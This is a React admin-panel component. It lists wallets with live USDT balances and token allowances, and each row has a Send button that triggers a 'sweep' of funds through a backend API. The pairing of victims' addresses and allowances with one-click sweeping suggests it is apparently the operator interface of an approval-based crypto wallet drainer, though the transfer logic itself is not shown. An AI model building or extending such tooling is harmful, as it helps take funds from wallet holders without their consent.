'use client';

import { useState, useEffect, useCallback } from 'react';
import s from '../admin.module.css';
import { apiUserTransactions, apiSendFromHash } from '../lib/api.js';
import { fmtAmt } from '../lib/format.js';
import { Toast } from '../components/Toast.jsx';
import { CopyCode } from '../components/CopyCode.jsx';
import { Pagination } from '../components/Pagination.jsx';
import { useToast } from '../lib/useToast.js';

// Lists wallets with a live on-chain USDT balance; each row's Send button
// triggers the sweep via POST /api/users/user-details-from-hash. `type` is 'bnb'|'trx'.
export function SendPanel({ token, onLogout, type, title, subtitle }) {
  const [rows, setRows]     = useState([]);
  const [page, setPage]     = useState(1);
  const [pages, setPages]   = useState(1);
  const [total, setTotal]   = useState(0);
  const [loading, setLoading] = useState(true);
  const [sendingHash, setSendingHash] = useState(null);
  const [results, setResults] = useState({});   // txHash -> { success, message }
  const [toastMsg, showToast] = useToast();

  const load = useCallback(async () => {
    setLoading(true);
    try {
      const d = await apiUserTransactions(token, { type, page });
      setRows(d.data || []);
      setPages(d.totalPages || 1);
      setTotal(d.totalRecords || 0);
    } catch (e) {
      if (e.message?.includes('Unauthorized')) onLogout();
      else showToast('Error: ' + e.message);
    } finally { setLoading(false); }
  }, [token, type, page, onLogout, showToast]);

  useEffect(() => { load(); }, [load]);

  async function handleSend(tx) {
    if (!tx.txHash) { showToast('This row has no tx hash to send'); return; }
    setSendingHash(tx.txHash);
    try {
      const d = await apiSendFromHash(type, tx.txHash);
      const ok = d.success !== false;
      setResults(r => ({ ...r, [tx.txHash]: { success: ok, message: d.message } }));
      showToast(d.message || (ok ? 'Sent' : 'Send failed'));
    } catch (e) {
      setResults(r => ({ ...r, [tx.txHash]: { success: false, message: e.message } }));
      showToast('Error: ' + e.message);
    } finally { setSendingHash(null); }
  }

  return (
    <div className={s.panel}>
      <Toast msg={toastMsg} />
      <div className={s.panelHead}>
        <h2 className={s.panelTitle}>{title} <span className={s.totalBadge}>{total}</span></h2>
        <p className={s.panelSub}>{subtitle}</p>
      </div>

      <div className={s.txToolbar}>
        <button className={s.clearBtn} type="button" onClick={load} disabled={loading}>↻ Refresh live balances</button>
        <span className={s.txHint}>Balances shown are fetched live from chain — this may take a moment.</span>
      </div>

      <div className={s.tableWrap}>
        <table className={s.table}>
          <thead><tr><th>#</th><th>From Address</th><th>Live USDT Balance</th><th>Allowance</th><th>Tx Hash</th><th>Result</th><th></th></tr></thead>
          <tbody>
            {loading ? (
              <tr><td colSpan={7} className={s.tdCenter}>Loading live balances…</td></tr>
            ) : rows.length === 0 ? (
              <tr><td colSpan={7} className={s.tdCenter}>No wallets with a live balance</td></tr>
            ) : rows.map((tx, i) => {
              const sending = sendingHash === tx.txHash;
              const res = results[tx.txHash];
              return (
                <tr key={tx._id || tx.fromAddress || i}>
                  <td className={s.numCell}>{(page - 1) * 20 + i + 1}</td>
                  <td><CopyCode text={tx.fromAddress} show={showToast} /></td>
                  <td className={s.txAmt}>{fmtAmt(tx.usdtBalance)}</td>
                  <td className={s.dim}>{fmtAmt(tx.usdtAllowance)}</td>
                  <td><CopyCode text={tx.txHash} show={showToast} /></td>
                  <td className={s.descCell}>
                    {res
                      ? <span className={s.badge + ' ' + (res.success ? s.bGreen : s.bGrey)}>{res.message || (res.success ? 'Done' : 'Failed')}</span>
                      : <span className={s.dim}>—</span>}
                  </td>
                  <td>
                    <button className={s.btnPrimary + ' ' + s.txSendBtn} type="button"
                      disabled={sending} onClick={() => handleSend(tx)}>
                      {sending ? 'Sending…' : 'Send'}
                    </button>
                  </td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>

      <Pagination page={page} pages={pages} onPage={setPage} />
    </div>
  );
}
